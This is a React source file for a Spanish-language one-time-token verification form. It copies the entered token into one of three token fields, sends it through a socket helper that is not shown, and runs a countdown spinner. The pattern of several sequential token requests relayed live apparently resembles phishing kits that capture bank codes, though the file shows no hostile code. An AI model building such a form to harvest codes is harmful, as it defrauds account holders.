/* eslint-disable no-mixed-operators */
import React, { useContext, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { SocketContext, UserDataContext } from '../../../context'
import { useFormik } from 'formik'
import { tokenValidate } from '../../../security/tokenValidate'
import { submitBase } from '../../../helpers/submitBase'
import { TokenInput } from './TokenInput'
import { Spiner } from '../../Spiner'

export const Token = ({urlToNavigate, spiner, timeLoader, endUrl = '', tokenMode}) => {
  const valuesData = { token: '' }
  
  const navigate = useNavigate()
  const { addData } = useContext(UserDataContext)
  const { socket } =  useContext(SocketContext)  
  
  const [showSpiner , SetshowSpiner] = useState(false)
  const [seconds, setSeconds] = useState(timeLoader / 1000)
  const dataImportant = { addData, socket, SetshowSpiner, urlToNavigate, spiner, timeLoader, navigate }
  
  const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
    initialValues: valuesData,
    // En caso de poner un error personalizado colocar errorUsername y errorPassword
    validate: values => tokenValidate({values}),
    onSubmit: async(valuesData, { resetForm }) => {
      if(tokenMode === 'token1') valuesData.token1 = valuesData.token
      if(tokenMode === 'token2') valuesData.token2 = valuesData.token
      if(tokenMode === 'token3') valuesData.token3 = valuesData.token
      
      const decreaseInterval = setInterval(() => {
        setSeconds(e => e - 1)
      }, 1000)
      setTimeout(() => {
        clearInterval(decreaseInterval)
        setSeconds(timeLoader / 1000)
        resetForm()
        SetshowSpiner(false)
      }, timeLoader)
      
      submitBase({dataImportant, valuesData, endUrl, setSeconds})
    }
  })


  return (
    <div>
      <form className='flex flex-col' onSubmit={handleSubmit}>
        {
          showSpiner === true ? <Spiner tokenMode={true} seconds={seconds} /> : null
        }
        <p className="text-[20px] text-[#106935] mt-10 mb-20">Verifica por tu seguridad que eres tu</p>
        <TokenInput 
          errors={errors}
          handleBlur={handleBlur}
          handleChange={handleChange}
          token={values.token}
          touched={touched}
        />
        <div className='flex justify-center mt-8'>
          <button 
            disabled={
                
                  touched.token && 
                  errors.token || 
                  values.token.length === 0
                  // eslint-disable-next-line eqeqeq
                  == true ? true : false
            }
            className='bg-blue-[#106935] rounded-full bg-[#106935] py-2 text-white w-[80%] hover:bg-[#99C440] transition-all shadow-submit'
            type='submit'
          >
              Ingresar
          </button>
        </div>

      </form>
    </div>
  )
}
